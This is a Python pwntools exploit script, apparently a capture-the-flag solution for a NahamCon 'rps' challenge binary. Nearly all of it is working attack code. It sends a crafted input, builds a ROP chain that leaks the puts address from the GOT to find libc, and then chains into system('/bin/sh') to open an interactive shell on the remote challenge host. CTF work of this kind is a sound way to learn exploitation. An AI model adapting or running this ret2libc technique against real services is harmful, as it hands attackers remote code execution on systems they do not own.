#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 30461 ./rps
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rps')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 30461)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# tbreak *0x{exe.entry:x}
b *0x401453
b *0x401313
b *0x4013e0
b *0x401452
continue
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

if args.LOCAL:
    l = exe.libc
else :
    l = ELF("libc-2.31.so")
io.sendlineafter("[y/n]: ","y")

pop_rdi = 0x0000000000401513
pop_rsi = 0x0000000000401511

win = 0x401313

io.sendlineafter("> ","1")
p = 'yes\n'.ljust(8,"\x00")
p += p64(0xdeadbeef)
p += p64(0x0000000000402008)
p += '\x08'
io.sendafter("[yes/no]: ",p)

p = 'a'*20
p += p64(pop_rdi)
p += p64(exe.got["puts"])
p += p64(exe.plt["puts"])
p += p64(win)
io.sendlineafter("> ",p)

io.sendlineafter("[yes/no]: ","no")

leak = (io.recvline()[:-1]).ljust(8,"\x00")
l.address = u64(leak) - l.sym["puts"]
print (hex(l.address))

p = 'a'*20
p += p64(pop_rdi)
p += p64(l.search("/bin/sh").next())
p += p64(pop_rsi)
p += p64(0)*2
p += p64(l.sym["system"])
io.sendlineafter("> ",p)

io.sendlineafter("[yes/no]: ","no")

io.interactive()
